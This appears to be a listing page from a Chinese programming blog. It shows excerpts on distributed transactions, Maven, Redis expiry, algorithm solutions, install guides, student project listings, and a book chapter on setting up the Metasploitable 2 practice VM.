该执行单元中的所有操作 要么都成功，要么都失败，
只要其中任一操作执行失败，都将导致整个事务的回滚。
1.2 分布式事务 了解了本地事务之后再了解一下分布式事务
如下所示，内容管理数据库、Redis、Elasticsearch、Minio都是通过网络来交互的
在分布式系统下，通过多个服务（网络交互）来完成一件事，这个时候就存在分布式事务
现在的需求是课程发布操作后将数据写入数据库、redis、elasticsearch、MinIO四个地方，这四个地方已经不限制在一个数据库内，是由四个分散的服务去提供，与这四个服务去通信需要网络通信，而网络存在不可到达性，这种分布式系统环境下，通过与不同的服务进行网络通信去完成事务称之为分布式事务。
在分布式系统中分布式事务的场景很多：
例如用户注册送积分，银行转账，创建订单减库存，这些都是分布式事务
转账举例：
我们知道本地事务依赖数据库本身提供的事务特性来实现，因此以下逻辑可以控制本地事务：
begin transaction； //1.本地数据库操作：张三减少金额 //2.本地数据库操作：李四增加金额 commit transation; 但是在分布式环境下，会变成下边这样：
说白了就是多个服务完成同一个事物
begin transaction； //1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5fe770810ff259e8f1a4a4784b9a52b9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5b5c8e4af2cfcb1b5d7bf4bed9f7137d/" rel="bookmark">
			Maven 简介
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		本文 Maven3.8.8 版本，搭配JDK17和IDEA2022版本，
依赖导入
项目构建
依赖分享
自动部署
1、为什么学习Maven 1.1、Maven是一个依赖管理工具 ① jar 包的规模 随着我们使用越来越多的框架，或者框架封装程度越来越高，项目中使用的jar包也越来越多。项目中，一个模块里面用到上百个jar包是非常正常的。
比如下面的例子，我们只用到 SpringBoot、SpringCloud 框架中的三个功能：
Nacos 服务注册发现Web 框架环境视图模板技术 Thymeleaf 最终却导入了 106 个 jar 包：
org.springframework.security:spring-security-rsa:jar:1.0.9.RELEASE:compile
com.netflix.ribbon: ribbon:jar:2.3.0:compile
org.springframework.boot:spring-boot-starter-thymeleaf:jar:2.3.6.RELEASE:compile
commons-configuration:commons-configuration:jar:1.8:compile
org.apache.logging.log4j:log4j-api:jar:2.13.3:compile
org.springframework:spring-beans:jar:5.2.11.RELEASE:compile
org.springframework.cloud:spring-cloud-starter-netflix-ribbon:jar:2.2.6.RELEASE:compile
org.apache.tomcat.embed:tomcat-embed-websocket:jar:9.0.39:compile
com.alibaba.cloud:spring-cloud-alibaba-commons:jar:2.2.6.RELEASE:compile
org.bouncycastle:bcprov-jdk15on:jar:1.64:compile
org.springframework.security:spring-security-crypto:jar:5.3.5.RELEASE:compile
org.apache.httpcomponents:httpasyncclient:jar:4.1.4:compile
com.google.j2objc:j2objc-annotations:jar:1.3:compile
com.fasterxml.jackson.core:jackson-databind:jar:2.11.3:compile
io.reactivex:rxjava:jar:1.3.8:compile
ch.qos.logback:logback-classic:jar:1.2.3:compile
org.springframework:spring-web:jar:5.2.11.RELEASE:compile
io.reactivex:rxnetty-servo:jar:0.4.9:runtime
org.springframework:spring-core:jar:5.2.11.RELEASE:compile
io.github.openfeign.form:feign-form-spring:jar:3.8.0:compile
io.github.openfeign.form:feign-form:jar:3.8.0:compile
com.netflix.ribbon:ribbon-loadbalancer:jar:2.3.0:compile
org.apache.httpcomponents:httpcore:jar:4.4.13:compile
org.thymeleaf.extras:thymeleaf-extras-java8time:jar:3.0.4.RELEASE:compile
org.slf4j:jul-to-slf4j:jar:1.7.30:compile
com.atguigu.demo:demo09-base-entity:jar:1.0-SNAPSHOT:compile
org.yaml:snakeyaml:jar:1.26:compile
org.springframework.boot:spring-boot-starter-logging:jar:2.3.6.RELEASE:compile
io.reactivex:rxnetty-contexts:jar:0.4.9:runtime
org.apache.httpcomponents:httpclient:jar:4.5.13:compile
io.github.openfeign:feign-core:jar:10.10.1:compile
org.springframework.boot:spring-boot-starter-aop:jar:2.3.6.RELEASE:compile
org.hdrhistogram:HdrHistogram:jar:2.1.9:compile
org.springframework:spring-context:jar:5.2.11.RELEASE:compile
commons-lang:commons-lang:jar:2.6:compile
io.prometheus:simpleclient:jar:0.5.0:compile
ch.qos.logback:logback-core:jar:1.2.3:compile
org.springframework:spring-webmvc:jar:5.2.11.RELEASE:compile
com.sun.jersey:jersey-core:jar:1.19.1:runtime
javax.ws.rs:jsr311-api:jar:1.1.1:runtime
javax.inject:javax.inject:jar:1:runtime
org.springframework.cloud:spring-cloud-openfeign-core:jar:2.2.6.RELEASE:compile
com.netflix.ribbon:ribbon-core:jar:2.3.0:compile
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5b5c8e4af2cfcb1b5d7bf4bed9f7137d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/deafcf95f0821b1c7b695218d5aa2b29/" rel="bookmark">
			【跳槽面试】Redis的过期键删除策略？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		前言 key的生存时间到了，Redis会立即删除吗？不会立即删除。
过期策略 • 定时删除：在设置key的过期时间的同时，为该key创建一个定时器，让定时器在key的过期时间来临时，对key进行删除
• 定期删除：Redis每隔一段时间就去会去查看Redis设置了过期时间的key，会再100ms的间隔中默认查看3个key。
• 惰性删除：
key过期的时候不删除，每次通过key获取值的时候去检查是否过期，若过期，则删除，返回null（用的时候再检查删除） 当去查询一个已经过了生存时间的key时，Redis会先查看当前key的生存时间是否已经到了，是则直接删除当前key，并且给用户返回一个空值。
Redis采用的过期策略 Redis采用的过期策略：惰性删除+定期删除
1. 惰性删除流程：在进行get或setnx等操作时，先检查key是否过期，若过期，删除key，然后执行相应操作；若没过期，直接执行相应操作
2. 定期删除流程：遍历每个数据库，检查当前库中的指定个数个key（默认是每个库检查20个key，注意相当于该循环执行20次，循环体时下边的描述）
a. 如果当前库中没有一个key设置了过期时间，直接执行下一个库的遍历。
b. 随机获取一个设置了过期时间的key，检查该key是否过期，如果过期，删除key。
c. 判断定期删除操作是否已经达到指定时长，若已经达到，直接退出定期删除。
技术交流 一个人走的很快，一群人走的更远。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4fa8a15de7667e13d4ec25db891971f5/" rel="bookmark">
			洛谷题单【算法1-7】搜索
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		P1135 奇怪的电梯 一开始以为深搜肯定没问题，从a点出发，衍生出一个二叉树，遍历所有情况就好了，但是会重复，所以加了一个vis防止重复，但是只拿了64pts，因为有可能某个点并不是最短被到达的，但是已经被标记上了vis，所以如果要遍历这一个整个合法的最短二叉树，应该要用BFS。
DFS的话因为是一直在搜，所以加一个dis数组，更新每个点的最短次数。
#include &lt;bits/stdc++.h&gt; //#define int long long #define per(i,j,k) for(int (i)=(j);(i)&lt;=(k);++(i)) #define rep(i,j,k) for(int (i)=(j);(i)&gt;=(k);--(i)) #define fr first #define se second #define endl '\n' using namespace std; const int N=200+5; int n,k[N],a,b,ans=INT_MAX,dis[N]; void dfs(int x,int step){ if(x&lt;1 or x&gt;n or step&gt;=dis[x] or step&gt;=ans)return; if(x==b)return ans=step,void(); dis[x]=step; dfs(x+k[x],step+1); dfs(x-k[x],step+1); } void solve(){ cin&gt;&gt;n&gt;&gt;a&gt;&gt;b; per(i,1,n)cin&gt;&gt;k[i],dis[i]=INT_MAX; dfs(a,0); ans=ans==INT_MAX?-1:ans; cout&lt;&lt;ans&lt;&lt;endl; } signed main(){ ios::sync_with_stdio(false),cin.tie(nullptr); int t=1; while(t--)solve(); return 0; } P2895 [USACO08FEB] Meteor Shower S 坑也太多了，下面列举一下坑，题不是很难，就模拟+BFS。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fa8a15de7667e13d4ec25db891971f5/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f0f89741fac28f6e802933caf4292d0f/" rel="bookmark">
			7. 整数反转-LeetCode（Java）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
整数反转-LeetCode（Java）
方法一：看做字符串反转
1.思路：
2.代码：
方法二：利用数学反转
1.思路
2.代码
整数反转-LeetCode（Java） 题目：7. 整数反转
给你一个 32 位的有符号整数 x ，返回将 x 中的数字部分反转后的结果。
如果反转后整数超过 32 位的有符号整数的范围 [−231, 231 − 1] ，就返回 0。
假设环境不允许存储 64 位整数（有符号或无符号）。
示例 1：
输入：x = 123 输出：321 示例 2：
输入：x = -123 输出：-321 示例 3：
输入：x = 120 输出：21 示例 4：
输入：x = 0 输出：0 提示：
-231 &lt;= x &lt;= 231 - 1 方法一：看做字符串反转 1.思路： 把 32 位的整数看成是一个字符串，然后直接调用 StringBuilder 的 reverse 方法，然后处理负数的情况，还有超出边界的情况。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f0f89741fac28f6e802933caf4292d0f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/43e83f532bbf29af89069cdf97b4a9ae/" rel="bookmark">
			机器学习周报第29周
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录 摘要Abstract一、文献阅读1.论文标题2.论文摘要3.论文背景4.论文方案4.1 多视角自注意力网络4.2 距离感知4.3 方向信息4.4 短语模式 二、self-attention 摘要 本周学习了多视角自注意力网络，在统一的框架下联合学习输入句子的不同语言学方面。具体来说，提出并利用多种诱导性偏差来规则化常规的注意力分配。然后通过混合注意力机制聚合不同的视图，以方便地量化和利用特定的视图及其相关的表示。Self-attention是一种在自然语言处理（NLP）和深度学习领域中广泛应用的机制。它允许模型关注输入序列中的不同部分，并根据这些部分生成输出。通过学习输入序列中不同位置之间的关系，self-attention可以帮助模型更好地理解输入并产生更有意义的输出。在Transformer架构中，self-attention作为核心组件，提高了模型在各种NLP任务中的性能，包括机器翻译、文本分类和问答等。本文将介绍self-attention的基本原理、应用和未来的研究方向。
Abstract This week, we learnt about multi-perspective self-attention networks that jointly learn different linguistic aspects of input sentences in a unified framework. Specifically, multiple induced biases are proposed and utilised to regularise regular attention allocation. The different views are then aggregated via a hybrid attention mechanism to facilitate the quantification and exploitation of specific views and their associated representations.Self-attention is a widely used mechanism in the fields of natural language processing (NLP) and deep learning.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/43e83f532bbf29af89069cdf97b4a9ae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6add5c59d48902b924f1e21d3582fa19/" rel="bookmark">
			Eclipses安装教程
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 一、下载开发工具包 1、开发工具包JDK
下载地址链接：https://www.oracle.com/cn/java/technologies/downloads/ 下载教程： 1）点击链接，可以跳转到页面
2）下滑页面，找到开发工具包
3） 记住下载之后的路径，以便配置环境变量
4）下载完成，安装过程：
如果选择更改，改变的就是开发工具包的下载路径了；不选择更改的话，就下一步，请注意要记得下载位置： C:\Program Files\Java\jdk-21\。（这个只是示例）
5）等待进度条的完成
6）点击关闭即安装完成
二、配置环境变量 1）打开文件夹，找到此电脑 2）找到高级系统设置 3）出现以下页面，点击环境变量 4）出现以下页面，根据步骤操作 1.JAVA_HOME 怕出错（直接复制），变量名：JAVA_HOME
变量值： C:\Program Files\Java\jdk-21
点击确定，即新建完成，新建完成之后就会出现原先显示的一样.
2 .CLASSPATH 以下的必须要一致： 变量名：CLASSPATH
变量值：.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar; 3. Path 将以下的变量值：
%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;
进行复制粘贴，然后点击确定。
5）测试JDK是否安装成功 1.电脑键盘快捷键，打开以下的页面： 2.输入：cmd ，点击确定，出现命令行窗口： 3 .java -version、java、javac 几个命令，出现以下信息，说明环境变量配置成功: 出现以上的显示情况证明，JDK 可以正常使用。 三、下载eclipses安装包 1）开发工具包安装完成，就可以下载Java的集成开发环境了。
下载链接：Eclipse Downloads | The Eclipse Foundation
下载步骤 ：
1.下滑，找到以下的显示页面
2.点击Download Packages
3.出现以下页面后，根据电脑的操作系统情况进行选择：
4.选择完成后，点击，然后会进行页面跳转。
根据以上圈框起来的，点击就行。
5. 点击之后会自动下载。出现以下显示，请根据所需自行选择，学生或者开发人员使用，建议框选起来的。
6. 我选择的是第一个。
2）点击INSTALL，然后选择安装路径地址，最后点击绿色键的下载。等待出现以下页面就行。
3）点击Launch，即安装完成。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/59473d66de0f83f55eb8450474776d7b/" rel="bookmark">
			第六章 漏洞利用 - 《骇客修成秘籍》
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		第六章 漏洞利用 作者：Julian Paul Assange
简介 一旦我们完成了漏洞扫描步骤，我们就了解了必要的知识来尝试利用目标系统上的漏洞。这一章中，我们会使用不同的工具来操作，包括系统测试的瑞士军刀 Metasploit。
这个秘籍中，我们会安装、配置和启动 Metasploitable 2。 Metasploitable 是基于 Linux 的操作系统，拥有多种可被 Metasploit 攻击的漏洞。它由 Rapid7 （Metasploit 框架的所有者）设计。Metasploitable 是个熟悉 Meterpreter 用法的极好方式。
准备 为了执行这个秘籍，我们需要下列东西：
互联网连接
VirtualBox PC 上的可用空间
解压缩工具（这里我们使用 Windows 上的 7-Zip）
操作步骤 让我们开始下载 Metasploitable 2。最安全的选择是从 SourceForge 获取下载包：
从这个链接下载 Metasploitable 2：。
将文件包括到硬盘的某个位置。
解压文件。
将文件夹内容放到你储存虚拟磁盘文件的位置。
打开 VirtualBox 并点击New按钮：
点击Next。
输入 Metasploitable 2 的名称并将Operating System:选择为Linux，Version:选项Ubuntu。像下面的截图那样点击Next。
如果可用的话，选择 512 MB，并点击Next。
选项现有磁盘，并从你下载和保存 Metasploitable 2 文件夹的地方选择 VDMK 文件。
你的虚拟磁盘窗口会像下面的截图那样。在这个示例中，我们完全不需要更新磁盘空间。这是因为使用 Metasploitable 的时候，你会攻击这个系统，而并不是将它用作操作系统。
![第六章 漏洞利用 - 图6](https://img-blog.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/59473d66de0f83f55eb8450474776d7b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/17fe317a82bfc813e75888e9ec1a3588/" rel="bookmark">
			使用sklearn严格计算AUROC和AUPRC
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用sklearn中的方法严格计算AUROC和AUPRC的值 1. AUROC的计算方法： from sklearn.metrics import roc_curve, auc fpr, tpr, _ = roc_curve(y_true, y_score) auroc = auc(fpr, tpr) 注意：其中y_score指的是模型输出的预测概率值，不是预测标签！
2. AUPRC的计算方法： from sklearn.metrics import precision_recall_curve, auc precision, recall, _ = precision_recall_curve(y_true, y_score, pos_label=1) auprc = auc(recall, precision) 注意：和上面一样，y_score指的也是模型输出的概率值；pos_label指的是正样本标签，默认为1
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/9486ec592a66001b233b1db23fbd7ccc/" rel="bookmark">
			排序算法--桶排序的原理及案例(Java)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		概述 桶排序，又叫箱排序，是一种比较常见的排序算法。其主要思想是分治思想，将大问题化成小问题。是将数组里的数据分配成几个区间中，然后再对区间里的数据分别排序，最后依次把各个区间中的记录列出来即可得到有序序列。 原理步骤 假设现在有一个数组 arr = [19, 27, 35, 43, 31, 22, 54, 66, 78, 2, 65, 56, 3, 1, 17, 20, 44, 7]观察将要排序的数组中的元素大小分布范围为（0，79），于是我们可以分成几个存储区间，例如:（0，19），（20，39），（40，59），（60，79），这些区间也就是桶，桶的数量，范围可以按照需要自行定义。然后将数组里的数据按照大小分配到对应的桶中。对各个桶内的数据进行排序，最后按顺序输出，即可得到大数组的排序结果。
Java代码 Java代码: public class BucketSort { public void bucketSort(int[] nums) { int n = nums.length; int min = nums[0], max = nums[0]; // 找出数组中的最大最小值 for (int i = 1; i &lt; n; i++) { min = Math.min(min, nums[i]); max = Math.max(max, nums[i]); } // 设置每个桶存储数的范围大小，可以根据需求指定。 // 为使得数尽量均匀地分布在各个桶中，所以这里根据数据范围设置，范围大小保证最少存储一个 int size = (max - min) / n + 1; // 设置桶的个数，与每个桶的范围有关，保证桶的个数至少为1 int count = (max - min) / size + 1; List&lt;Integer&gt;[] buckets = new List[count]; // 声明count个数组用来表示桶 for (int i = 0; i &lt; count; i++) { buckets[i] = new ArrayList&lt;&gt;(); } // 扫描一遍数组，将符合范围的数放进桶里 for (int i = 0; i &lt; n; i++) { int idx = (nums[i] - min) / size; buckets[idx].
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/9486ec592a66001b233b1db23fbd7ccc/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8ce33bb628609693a56213edc626fdca/" rel="bookmark">
			Red Hat Enterprise Linux 7.9 安装图解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		风险告知 本人及本篇博文不为任何人及任何行为的任何风险承担责任，图解仅供参考，请悉知！本次安装图解是在一个全新的演示环境下进行的，演示环境中没有任何有价值的数据，但这并不代表摆在你面前的环境也是如此。生产环境全新安装或者自行测试都可参放心考该安装图解，该教程是完全模拟实际生产环境硬件及常规配置的（业务厂商有特殊要求的除外）。操作系统平刷、升级、类型更换等非全新安装操作，需要全面评估并且备份有价值数据后再进行。因为任何操作都是有丢失数据风险的可能，比如说误操作覆盖或者格式化有价值数据的磁盘驱动器或者分区的操作都无异于删库，无论是你是否即将跑路！ 引导和开始安装 选择倒计时结束前，通过键盘上下键选择下图框选项，启动图形化安装过程。需要注意的是不同主板默认或者自行配置的固件类型不一致，引导界面有所不同。也就是说使用UEFI和BIOS的安装引导界面是不同的，如图所示。若手动调整固件类型需要在安装前完成，安装结束后严禁调整。
安装器语言选择 这里要区分一下，当前选中的语言作为安装过程中安装器所使用的语言，这里我们选择中文简体。不过细心的同学可能发现，当你选择安装器语言之后，后续在配置操作系统语言支持项时，操作系统也会默认选择支持被选中的语言，这也契合了现在越来越多的业务对中文支持的要求。
安装信息摘要 建议安装时就进行配置或确认如图所示的6处框选项，其余配置项保持默认即可。
时间和日期配置项 地区的配置决定了操作系统时间所使用的时区，根据实际情况选择即可。网络时间功能就时配置一个时间同步服务器，用于校正系统时间。实际生产环境中我们一般会选择同步企业内部的NTP服务器，也叫时间戳服务器。配置网络时间之前需要先配置网络，要不然咋"说话"，对吧？
语言支持配置项 为了以后使用的便捷性，建议这里至少选择支持两种语言，即中文简体和美国英语。注意，根据前面安装器语言选择的配置，操作系统会设置中文为默认操作语言，当然，有强迫症的同学可以在安装完成后，自行进行修改为默认美国英语或者其他语言。
软件选择配置项 软件包的选择是要特别注意的，默认最小安装，不过有些发行版默认安装带GUI的桌面环境，但是实际生产环境中很少使用，而且相对很占用系统资源，即便是偶尔真需要桌面环境也可以通过X-Server方式轻松实现。所以我这里采用默认最小化方式安装。 安装目标配置 也就是说你要把操作系统安装到哪个物理驱动器，并进行分区（挂载点），这里直接选择自动即可，除非业务厂商有特别要求。实际生产环境建议操作系统使用一块独立的磁盘驱动器，数据所需的空间单独挂载即可，这样无论是维护还是结构都很清晰。
KDUMP配置项 KDUMP只有对于购买技术服务并且遇到问题一定要追根溯源的用户来讲是可以开启的，但是对于大多数用户来讲，没什么卵用，几乎用不到，所以这里我关了，您随意。
主机名配置项 主机名也就类似于Windows中的计算机名称，作为区分计算机节点的标识，输入想要的主机名之后应用即可，这里给出一个小小的建议，实际生产环境中看到很多计算机名称毫无意义，个人来讲不是很推荐这样做，最好是能定义一个跟业务相关的名称，总之，基本原则就是尽可能的做到见名知意。
网络配置项 首先启用指定网卡，然后点击配置，切换到IPv4协议栈添加IP地址保存即可。实际生产环境中内外网都进行了逻辑或者是物理隔离，并且采用手动分配静态IP地址，内网服务器也很少配置DNS服务器（使用AD域环境除外）。IPv6协议栈根据实际需要进行配置，目前来讲生产环境很少使用。
检查确认网络和主机名配置项 确认主机名和以太网配置信息准确无误后点击完成。
确认开始安装 所有框选项配置完成后，点击开始安装。
root用户配置 默认锁定root用户，这里建议启用，配置并确认root用户密码。
等待重启引导操作系统 稍时等待，即可开饭！
登录操作系统 使用安装过程中配置的root用户和密码登录操作系统 Red Hat Enterprise Linux GNU/Linux的官方文档 上述的安装过程仅仅是在生产环境中常用的安装步骤，以最快的速度来部署生产环境。所以非常推荐同学们空闲时间来阅读Red Hat Enterprise Linux的官方文档，既成体系，又严谨准确，原生英文，十分锻炼英语水平，认真读完之后，你一定会受益匪浅。
学到老的过程中，请时刻牢记一句话，那就是万事万物的本质是相通的，一法通万法皆通 ！
Red Hat Enterprise Linux官方网站https://www.redhat.com/en/technologies/linux-platforms/enterprise-linux
Red Hat Enterprise Linux文档中心（需要注册免费账号，包含安装手册、管理员手册、更新日志等）https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux
Red Hat Enterprise Linux开发者渠道下载镜像（正常渠道下载需要付费订阅）https://mp.csdn.net/mp_blog/creation/editor/135666556
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/f8ce2979fe0bb49dc4e5c46e1de5e443/" rel="bookmark">
			基于javaweb&#43;mysql的ssm演唱会购票系统(java&#43;ssm&#43;mysql&#43;jsp&#43;tomcat)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于javaweb+mysql的ssm演唱会购票系统(java+ssm+mysql+jsp+tomcat)
私信源码获取及调试交流
运行环境
Java≥8、MySQL≥5.7、Tomcat≥8
开发工具
eclipse/idea/myeclipse/sts等均可配置运行
适用
课程设计，大作业，毕业设计，项目练习，学习演示等
功能说明
基于javaweb的SSM演唱会购票系统(java+ssm+mysql+jsp+tomcat)
管理员：
admin 123456
用户：
user1 123456
user2 123456
user3 123456
public String personal(Users users) { this.front(); if (this.getSession().getAttribute("userid") == null) { return "redirect:/index/preLogin.action"; } this.usersService.updateUsers(users); return "redirect:/index/userinfo.action"; } // 添加演唱会到购物车 @RequestMapping("addcart.action") public String addcart() { this.front(); if (this.getSession().getAttribute("userid") == null) { return "redirect:/index/preLogin.action"; } String userid = (String) this.getSession().getAttribute("userid"); Cart cart = new Cart(); cart.setAddtime(VeDate.getStringDateShort()); cart.setConcertid(getRequest().getParameter("concertid")); cart.setTicketid(this.getRequest().getParameter("ticketid")); cart.setNum(getRequest().getParameter("num")); Ticket ticket = this.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/f8ce2979fe0bb49dc4e5c46e1de5e443/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c2499511655cac318ac9f81773269ce3/" rel="bookmark">
			基于javaweb&#43;mysql的ssm&#43;maven高考志愿智能资讯系统(java&#43;ssm&#43;mysql&#43;vue&#43;html)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于javaweb+mysql的ssm+maven高考志愿智能资讯系统(java+ssm+mysql+vue+html)
私信源码获取及调试交流
运行环境
Java≥8、MySQL≥5.7、Tomcat≥8、Node.js≥10
开发工具
后端：eclipse/idea/myeclipse/sts等均可配置运行
前端：WebStorm/VSCode/HBuilderX等均可
适用
课程设计，大作业，毕业设计，项目练习，学习演示等
功能说明
基于javaweb的SSM+Maven高考志愿智能资讯系统(java+ssm+mysql+vue+html)
/ssm43x92
前台：
http://localhost:8080/ssm43x92/front/pages/login/login.html
后台：
http://localhost:8080/ssm43x92/admin/dist/index.html#/login
用户：
用户1 123456
用户2 123456
用户3 123456
用户4 123456
管理员：
admin 123456
如果要单独运行前端（front-end-admin），启动命令：npm run serve
//ValidatorUtils.validateEntity(yonghu); YonghuEntity user = yonghuService.selectOne(new EntityWrapper&lt;YonghuEntity&gt;().eq("zhanghao", yonghu.getZhanghao())); if(user!=null) { return R.error("用户已存在"); } yonghu.setId(new Date().getTime()); yonghuService.insert(yonghu); return R.ok(); } /** * 前端保存 */ @RequestMapping("/add") public R add(@RequestBody YonghuEntity yonghu, HttpServletRequest request){ yonghu.setId(new Date().getTime()+new Double(Math.floor(Math.random()*1000)).longValue()); //ValidatorUtils.validateEntity(yonghu); YonghuEntity user = yonghuService.selectOne(new EntityWrapper&lt;YonghuEntity&gt;().
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/c2499511655cac318ac9f81773269ce3/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/84d30fba66cf86c580fc54a0626bd2e7/" rel="bookmark">
			基于javaweb&#43;mysql的jsp&#43;servlet简单学生信息管理系统(java&#43;servlet&#43;mysql&#43;jsp)
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		基于javaweb+mysql的jsp+servlet简单学生信息管理系统(java+servlet+mysql+jsp)
私信源码获取及调试交流
运行环境
Java≥8、MySQL≥5.7、Tomcat≥8
开发工具
eclipse/idea/myeclipse/sts等均可配置运行
适用
课程设计，大作业，毕业设计，项目练习，学习演示等
功能说明
基于javaweb的JSP+Servlet简单学生信息管理系统(java+servlet+mysql+jsp)
登录：
admin 123456
功能：
登录、注册、学生信息的增删改查管理
//6.判断是否登录成功 if (loginStudent != null) { //登录成功 //将用户存入session session.setAttribute("user", loginStudent); session.setAttribute("loginUser", loginStudent); //跳转页面 response.sendRedirect(request.getContextPath() + "/findUserByPageServlet"); } else { //登录失败 //提示信息 request.setAttribute("login_msg", "用户名或密码错误！"); //跳转登录页面 request.getRequestDispatcher("/login.jsp").forward(request, response); } } protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException { this.doPost(request, response); } } /** * 验证码 */ request.setCharacterEncoding("utf-8"); //1.获取参数 String currentPage = request.getParameter("currentPage");//当前页码 String rows = request.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/84d30fba66cf86c580fc54a0626bd2e7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6003956e0350ecc229736c8c75f4bbb2/" rel="bookmark">
			[娱乐]索尼电视安装Kodi
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		索尼电视不能直接apk安装kodi应用 android studio安装后附带 abd， 路径 C:\Users\[yourname]\AppuoData\Local\Android\Sdk\platform-tools\adb.exe 安卓电视点击内部版本号，启用开发者模式 adb 连接索尼安卓电视，记得电视上运行调试 abi选armeabi-v7 参考 https://blog.csdn.net/ufolr/article/details/90729779
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5becde68d1bebe7412a04f8a5a5b6aae/" rel="bookmark">
			在MD编辑器里插入20次方问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言 看了很多文章里面没写怎么插入20次方，最后在官网的一篇文章上看到了很详细的数学公式的插入。
问题 大家肯定以为这样就可以了
效果 明显是不行的
解决 使用{}把数字括起来就可以了。
1 20 1^{20} 120
小知识 在行内显示(就是与文字在一起)
$ $ 另起一行居中显示
$$ $$ 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/205943300a08775f6da556c9d063f57a/" rel="bookmark">
			【AI】深度学习在编码中的应用（9）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		接上，本文来讨论基于条件熵编码的框架。
智能图像压缩中的基于条件熵编码的框架是一种先进的编码技术，它利用图像数据的统计特性来实现高效的压缩。以下是关于该框架的定义、原理、优势和劣势，以及关键技术的详细解释，同时包括框架中的主要组成部分及其阐述。
定义 基于条件熵编码的框架是一种图像压缩方法，它通过分析图像数据的条件概率分布来编码像素或特征，从而达到减少数据存储量的目的。条件熵是衡量在已知某些条件下，随机变量不确定性的一种度量。
原理 该框架的原理在于利用图像中像素或特征之间的相关性。编码器会根据已编码的数据（如相邻像素的值）来预测当前要编码的数据，并计算预测误差。然后，这些预测误差会被量化和编码，形成压缩的比特流。解码器则利用相同的预测模型来重建原始图像。
